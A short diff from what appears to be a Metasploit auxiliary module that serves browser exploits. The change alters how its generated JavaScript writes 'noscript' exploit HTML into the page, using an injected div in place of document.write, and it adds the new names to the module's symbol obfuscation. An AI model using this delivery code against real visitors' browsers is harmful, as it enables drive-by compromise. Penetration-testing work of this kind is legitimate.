@@ -685,11 +685,16 @@ class Metasploit3 < Msf::Auxiliary
 				opts['Symbols']['Methods'].push("#{func_name}")
 			end
 		}
-		js << "var noscript_exploits = unescape(\"" 
-		p Rex::Text.to_hex(build_noscript_html(cli, request), "%")
+		js << "var noscript_exploits = \"" 
 		js << Rex::Text.to_hex(build_noscript_html(cli, request), "%")
-		js << "\");"
-		js << "document.write(\"<div>\" + noscript_exploits);"
+		js << "\";"
+		js << 'noscript_div = document.createElement("div");'
+		js << "noscript_div.innerHTML = unescape(noscript_exploits);"
+		js << "document.body.appendChild(noscript_div);"
+
+		#js << "document.write(\"<div>\" + noscript_exploits);"
+		opts['Symbols']['Methods'].push("noscript_exploits")
+		opts['Symbols']['Methods'].push("noscript_div")
 		js << "#{js_debug("'starting exploits<br>'")}\n"
 		js << "next_exploit(0);\n"
 
